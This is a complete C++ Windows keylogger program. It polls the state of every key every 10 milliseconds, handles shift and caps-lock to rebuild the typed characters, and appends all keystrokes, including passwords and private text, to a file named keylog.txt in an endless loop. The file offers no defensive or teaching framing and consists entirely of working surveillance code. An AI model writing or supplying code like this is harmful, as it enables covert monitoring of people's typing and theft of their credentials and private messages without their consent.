#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

bool isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

bool isShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) ||
           (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
           (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
}

int main() {
    ofstream logFile("keylog.txt", ios::app);
    if (!logFile.is_open()) {
        cerr << "Failed to open log file." << endl;
        return 1;
    }

    bool keyStates[256] = { false };

    while (true) {
        Sleep(10); // 10ms delay

        for (int key = 8; key <= 255; key++) {
            SHORT keyState = GetAsyncKeyState(key);

            if ((keyState & 0x8000) && !keyStates[key]) {
                keyStates[key] = true;

                bool shift = isShiftPressed();
                bool caps = isCapsLockOn();

                switch (key) {
                    case VK_SPACE: logFile << " "; break;
                    case VK_RETURN: logFile << "[ENTER]\n"; break;
                    case VK_BACK: logFile << "[BACKSPACE]"; break;
                    case VK_TAB: logFile << "[TAB]"; break;
                    case VK_ESCAPE: logFile << "[ESC]"; break;

                    // Ignore logging SHIFT / CTRL keys themselves
                    case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: break;
                    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: break;

                    // Punctuation/symbol keys
                    case 0xBA: logFile << (shift ? ":" : ";"); break;
                    case 0xBB: logFile << (shift ? "+" : "="); break;
                    case 0xBC: logFile << (shift ? "<" : ","); break;
                    case 0xBD: logFile << (shift ? "_" : "-"); break;
                    case 0xBE: logFile << (shift ? ">" : "."); break;
                    case 0xBF: logFile << (shift ? "?" : "/"); break;
                    case 0xC0: logFile << (shift ? "~" : "`"); break;
                    case 0xDB: logFile << (shift ? "{" : "["); break;
                    case 0xDC: logFile << (shift ? "|" : "\\"); break;
                    case 0xDD: logFile << (shift ? "}" : "]"); break;
                    case 0xDE: logFile << (shift ? "\"" : "'"); break;

                    default:
                        if (key >= 'A' && key <= 'Z') {
                            bool upper = shift ^ caps;
                            char ch = upper ? char(key) : char(key + 32);
                            logFile << ch;
                        } else if (key >= '0' && key <= '9') {
                            if (shift) {
                                string symbols[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                                logFile << symbols[key - '0'];
                            } else {
                                logFile << char(key);
                            }
                        }
                        break;
                }

                logFile.flush();
            } else if (!(keyState & 0x8000) && keyStates[key]) {
                keyStates[key] = false;
            }
        }
    }

    logFile.close();
    return 0;
}
